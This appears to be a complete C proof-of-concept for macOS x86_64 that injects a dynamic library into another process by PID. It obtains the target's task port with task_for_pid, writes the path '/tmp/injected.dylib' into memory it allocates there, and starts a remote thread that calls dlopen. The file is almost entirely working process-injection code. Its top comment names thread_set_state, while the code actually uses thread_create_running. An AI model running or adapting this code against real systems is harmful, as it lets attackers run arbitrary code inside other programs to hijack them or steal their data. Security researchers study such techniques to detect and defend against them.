
// Use thread_set_state to inject a .dylib into remote task
#import <mach/mach.h>
#import <mach-o/dyld_images.h>
#import <mach/mach_vm.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>
#import <dlfcn.h>
#import <pthread.h>

#if defined(__x86_64__)
#define THREAD_STATE x86_THREAD_STATE64
#define THREAD_STATE_COUNT x86_THREAD_STATE64_COUNT
#define THREAD_STATE_T x86_thread_state64_t
#else
#error Only x86_64 is supported in this PoC
#endif

#ifndef RTLD_NOW
#define RTLD_NOW 2
#endif

#define DYLIB_PATH "/tmp/injected.dylib"

void inject_dylib(pid_t pid) {
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        printf("task_for_pid failed: %d\n", kr);
        return;
    }

    // Allocate memory in remote process
    mach_vm_address_t remote_stack = 0;
    mach_vm_address_t remote_code = 0;
    kr = mach_vm_allocate(remoteTask, &remote_stack, 4096, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("mach_vm_allocate (stack) failed: %d\n", kr);
        return;
    }
    kr = mach_vm_allocate(remoteTask, &remote_code, 4096, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("mach_vm_allocate (code) failed: %d\n", kr);
        return;
    }

    // Write the dylib path into remote memory
    kr = mach_vm_write(remoteTask, remote_code, (vm_offset_t)DYLIB_PATH, (mach_msg_type_number_t)strlen(DYLIB_PATH) + 1);
    if (kr != KERN_SUCCESS) {
        printf("mach_vm_write failed: %d\n", kr);
        return;
    }

    // Setup thread state to call dlopen(remote_code, RTLD_NOW)
    THREAD_STATE_T state;
    memset(&state, 0, sizeof(state));
    void *dlopen_addr = dlsym(RTLD_DEFAULT, "dlopen");
    if (!dlopen_addr) {
        printf("Failed to resolve dlopen\n");
        return;
    }
    state.__rip = (uint64_t)dlopen_addr;
    state.__rdi = (uint64_t)remote_code; // 1st arg: path
    state.__rsi = (uint64_t)RTLD_NOW;    // 2nd arg: flags
    state.__rsp = remote_stack + 4096 - 8;
    state.__rbp = 0;

    // Push a return address (0) onto the stack
    uint64_t zero = 0;
    kr = mach_vm_write(remoteTask, state.__rsp, (vm_offset_t)&zero, sizeof(zero));
    if (kr != KERN_SUCCESS) {
        printf("mach_vm_write (rsp) failed: %d\n", kr);
        return;
    }

    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, THREAD_STATE, (thread_state_t)&state, THREAD_STATE_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        printf("thread_create_running failed: %d\n", kr);
        return;
    }

    printf("[+] dylib injected to PID %d\n", pid);
}
